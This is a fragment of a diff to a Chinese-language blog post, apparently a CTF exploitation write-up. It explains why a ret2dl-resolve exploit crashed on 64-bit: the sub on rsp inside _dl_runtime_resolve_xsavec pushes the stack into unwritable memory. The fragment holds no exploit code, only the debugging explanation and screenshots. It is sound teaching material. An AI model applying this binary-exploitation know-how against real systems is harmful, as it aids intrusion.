-<li>找到罪魁祸首了,偏移就是这条sub指令造成的<img src="https://s1.ax1x.com/2020/06/13/tvkvcD.png" srcset="/img/loading.gif" alt=""></li>
-<li>在32位下，ret2dl调用的是：<code>_dl_runtime_resolve</code>，如图<img src="https://s1.ax1x.com/2020/06/13/tvAyvD.png" srcset="/img/loading.gif" alt=""></li>
-<li><strong>而64位下，ret2dl调用</strong><code>_dl_runtime_resolve_xsavec</code>，如图：<img src="https://s1.ax1x.com/2020/06/13/tvAWVA.png" srcset="/img/loading.gif" alt=""><strong>明显对rsp有一个sub操作，偏移就是他造成的。这次也算是踩坑了，以后也记住了要考虑一下这个玩意。。</strong></li>
+<li>在编写exp的时候，遇到了一些诡异的问题，比如一开始想把他放在bss+0x500，结果。。<img src="https://s1.ax1x.com/2020/06/13/tvPj1g.jpg" alt="">)出现了诡异的非法内存访问。。在64位下调用的是<code>_dl_runtime_resolve_xsavec</code>,这个函数起始是有写地址操作的。但是按理说我应该把他已经放上bss了而bss是可读可写的，看一下这个时候的rsp，确实落在一个不可写的区间，并且这个区间是相对bss有偏移的。<img src="https://s1.ax1x.com/2020/06/13/tviI8U.jpg" alt=""></li>
+<li>leave之后确实栈被拉到了bss+0x500<img src="https://s1.ax1x.com/2020/06/13/tvF5dI.png" alt=""></li>
+<li>一直到进入<code>_dl_runtime_resolve_xsavec</code>都是没问题的。看来问题就是出在下面那两条指令上了。<img src="https://s1.ax1x.com/2020/06/13/tvk16e.png" alt=""></li>
+<li>找到罪魁祸首了,偏移就是这条sub指令造成的<img src="https://s1.ax1x.com/2020/06/13/tvkvcD.png" alt=""></li>
+<li>在32位下，ret2dl调用的是：<code>_dl_runtime_resolve</code>，如图<img src="https://s1.ax1x.com/2020/06/13/tvAyvD.png" alt=""></li>
+<li><strong>而64位下，ret2dl调用</strong><code>_dl_runtime_resolve_xsavec</code>，如图：<img src="https://s1.ax1x.com/2020/06/13/tvAWVA.png" alt=""><strong>明显对rsp有一个sub操作，偏移就是他造成的。这次也算是踩坑了，以后也记住了要考虑一下这个玩意。。</strong></li>
 </ul>
 <h2 id="主要参考文章"><a href="#主要参考文章" class="headerlink" title="主要参考文章"></a>主要参考文章</h2><p><a href="https://forum.90sec.com/t/topic/260" target="_blank" rel="noopener">1</a><br><a href="https://bbs.pediy.com/thread-253833.htm" target="_blank" rel="noopener">2</a></p>
 
